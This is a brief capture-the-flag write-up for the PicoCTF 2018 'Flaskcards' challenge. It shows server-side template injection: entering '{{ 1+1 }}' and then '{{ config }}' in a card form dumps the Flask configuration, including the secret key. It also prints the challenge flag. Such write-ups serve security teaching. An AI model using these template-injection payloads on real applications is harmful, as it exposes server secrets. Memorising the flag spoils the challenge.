# PicoCTF 2018 "Flaskcards"

<http://2018shell.picoctf.com:43165>

Flask is used in this problem.

First, register test account, and sign in.

There is "Create Card" page.

When I input {{ 1+1 }} in question form, "2" is displayed in "List Cards" page.

The command enclosed in {{  }} is processed in server.

This is Server-Side Template Injection problem.

So, when input {{ config }} in question form, I can get all config values.

```
<Config {'SQLALCHEMY_POOL_TIMEOUT': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PREFERRED_URL_SCHEME': 'http', 'SQLALCHEMY_POOL_SIZE': None, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'SESSION_COOKIE_SAMESITE': None, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'APPLICATION_ROOT': '/', 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'SESSION_COOKIE_NAME': 'session', 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SESSION_COOKIE_DOMAIN': False, 'JSON_AS_ASCII': True, 'EXPLAIN_TEMPLATE_LOADING': False, 'SQLALCHEMY_NATIVE_UNICODE': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'SQLALCHEMY_BINDS': None, 'TEMPLATES_AUTO_RELOAD': None, 'ENV': 'production', 'BOOTSTRAP_CDN_FORCE_SSL': False, 'SQLALCHEMY_MAX_OVERFLOW': None, 'TRAP_HTTP_EXCEPTIONS': False, 'SESSION_REFRESH_EACH_REQUEST': True, 'PROPAGATE_EXCEPTIONS': None, 'SERVER_NAME': None, 'DEBUG': False, 'SESSION_COOKIE_PATH': None, 'JSON_SORT_KEYS': True, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SESSION_COOKIE_HTTPONLY': True, 'JSONIFY_MIMETYPE': 'application/json', 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_8f40629c}', 'SQLALCHEMY_RECORD_QUERIES': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_ECHO': False, 'USE_X_SENDFILE': False, 'MAX_CONTENT_LENGTH': None, 'SESSION_COOKIE_SECURE': False, 'BOOTSTRAP_USE_MINIFIED': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'SQLALCHEMY_POOL_RECYCLE': None, 'BOOTSTRAP_SERVE_LOCAL': False}>
```

Flag is picoCTF{secret_keys_to_the_kingdom_8f40629c}

## Reference documents

<https://qiita.com/koki-sato/items/6ff94197cf96d50b5d8f>
